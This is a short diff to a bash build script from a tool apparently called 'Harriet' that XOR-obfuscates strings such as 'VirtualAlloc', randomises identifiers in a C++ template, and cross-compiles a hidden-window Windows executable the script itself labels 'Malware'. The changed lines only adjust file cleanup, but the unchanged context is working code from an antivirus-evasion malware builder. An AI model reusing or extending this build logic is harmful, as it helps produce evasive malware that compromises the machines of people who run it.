@@ -112,7 +112,7 @@ sed -i "s/XOR_KEY/$XOR_KEY/g" Harriet/FULLAes/Resources/xor.py
 cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-18} | head -n 1 > shell.txt
 XOR_VARIABLE=$(cat shell.txt)
 sed -i "s/XOR_VARIABLE/$XOR_VARIABLE/g" Harriet/FULLAes/Resources/template.cpp
-rm shell.txt
+rm -f shell.txt
 
 #VIRTUALALLOC - XOR String
 echo VirtualAlloc > virt.txt
@@ -120,13 +120,13 @@ python3 Harriet/FULLAes/Resources/xor.py virt.txt > virtalloc.txt
 virt=$(cat virtalloc.txt)
 virt2="${virt::-9}" 
 sed -i "s/VIRALO/$virt2/g" Harriet/FULLAes/Resources/template.cpp 
-rm virt*
+rm -f virt*.txt
 
 echo -e ${yellow}"+++Compiling Malware+++"${clear}
 x86_64-w64-mingw32-g++ -o $MALWARE Harriet/FULLAes/Resources/template.cpp -fpermissive -Wno-narrowing Harriet/Resources/resources.res -mwindows -O2 >/dev/null 2>&1
 echo ""
 sleep 2
-rm shell*
+rm shell*.txt
 echo -e ${yellow}"***Malware Compiled***"${clear}
 echo ""
 sleep 2
